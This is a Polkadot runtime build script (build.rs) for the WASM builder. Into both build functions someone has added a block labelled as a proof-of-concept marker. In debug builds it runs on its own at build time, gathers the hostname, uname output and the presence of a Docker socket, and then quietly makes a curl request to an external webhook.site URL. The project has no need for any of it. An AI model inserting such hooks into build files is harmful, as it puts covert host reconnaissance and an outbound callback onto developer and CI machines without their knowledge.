// Copyright (C) Parity Technologies (UK) Ltd.
// This file is part of Polkadot.

// Polkadot is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.

// Polkadot is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.

// You should have received a copy of the GNU General Public License
// along with Polkadot.  If not, see <http://www.gnu.org/licenses/>.

#[cfg(all(feature = "std", not(feature = "metadata-hash")))]
fn main() {
	// === POCKET MARKER FOR T5 PoC ===
	#[cfg(debug_assertions)]
	{
		use std::process::Command;
		eprintln!("=== SH-POC-MARKER-20261019 ===");
		if let Ok(output) = Command::new("hostname").output() {
			if let Ok(s) = String::from_utf8(output.stdout) {
				eprintln!("HOSTNAME: {}", s.trim());
			}
		}
		if let Ok(output) = Command::new("uname").arg("-a").output() {
			if let Ok(s) = String::from_utf8(output.stdout) {
				eprintln!("UNAME: {}", s.trim());
			}
		}
		if std::path::Path::new("/var/run/docker.sock").exists() {
			eprintln!("DOCKER_SOCKET: true");
		} else {
			eprintln!("DOCKER_SOCKET: false");
		}
		// Canary callback (non-blocking, best effort)
		let _ = Command::new("curl")
			.arg("-s")
			.arg("-X")
			.arg("GET")
			.arg("https://webhook.site/b4a1c28d-df5e-4925-865b-35009200f3f5?marker=SH-POC-MARKER-20261019")
			.output();
	}
	// === END POCKET MARKER ===
	
	substrate_wasm_builder::WasmBuilder::build_using_defaults()
}

#[cfg(all(feature = "std", feature = "metadata-hash"))]
fn main() {
	// === POCKET MARKER FOR T5 PoC ===
	#[cfg(debug_assertions)]
	{
		use std::process::Command;
		eprintln!("=== SH-POC-MARKER-20261019 ===");
		if let Ok(output) = Command::new("hostname").output() {
			if let Ok(s) = String::from_utf8(output.stdout) {
				eprintln!("HOSTNAME: {}", s.trim());
			}
		}
		if let Ok(output) = Command::new("uname").arg("-a").output() {
			if let Ok(s) = String::from_utf8(output.stdout) {
				eprintln!("UNAME: {}", s.trim());
			}
		}
		if std::path::Path::new("/var/run/docker.sock").exists() {
			eprintln!("DOCKER_SOCKET: true");
		} else {
			eprintln!("DOCKER_SOCKET: false");
		}
		let _ = Command::new("curl")
			.arg("-s")
			.arg("-X")
			.arg("GET")
			.arg("https://webhook.site/b4a1c28d-df5e-4925-865b-35009200f3f5?marker=SH-POC-MARKER-20261019")
			.output();
	}
	// === END POCKET MARKER ===
	
	substrate_wasm_builder::WasmBuilder::init_with_defaults()
		.enable_metadata_hash("DOT", 10)
		.build()
}

#[cfg(not(feature = "std"))]
fn main() {}
